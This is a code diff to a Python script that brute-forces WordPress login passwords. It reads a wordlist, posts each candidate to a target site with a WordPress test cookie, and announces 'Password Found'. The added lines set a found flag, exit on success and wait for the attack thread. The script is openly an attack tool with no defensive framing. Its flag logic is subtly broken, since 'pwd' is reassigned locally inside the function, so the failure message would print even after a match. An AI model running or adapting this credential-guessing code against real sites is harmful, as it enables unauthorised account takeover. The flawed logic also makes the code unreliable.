@@ -2,6 +2,8 @@ import sys
 import requests
 import threading
 
+pwd = "0"
+
 cookies = {
     'wordpress_test_cookie': 'WP+Cookie+check',
 }
@@ -28,7 +30,7 @@ def Brute():
     print()
     print("[*] Started Brute Force Attack On Target")
     print("[+] Attacking")
-    passwords = [x.strip() for x in open('C:\\Users\\hp\\passwords.txt', 'r').readlines() if x]
+    passwords = [x.strip() for x in open('Wordlist.txt', 'r').readlines() if x]
     
     for password in passwords:
         data = {
@@ -47,13 +49,17 @@ def Brute():
         print()
         print("[+] Password Found: " + password)
         pwd = "1"
+        sys.exit()
 
 try:
     thread = threading.Thread(target=Brute)
     thread.start()
-
+    thread.join()
 except KeyboardInterrupt:
     print("[-] Aborted")
     sys.exit()
 
 
+if pwd == "0":
+    print("[-] Password Not Found")
+    sys.exit()
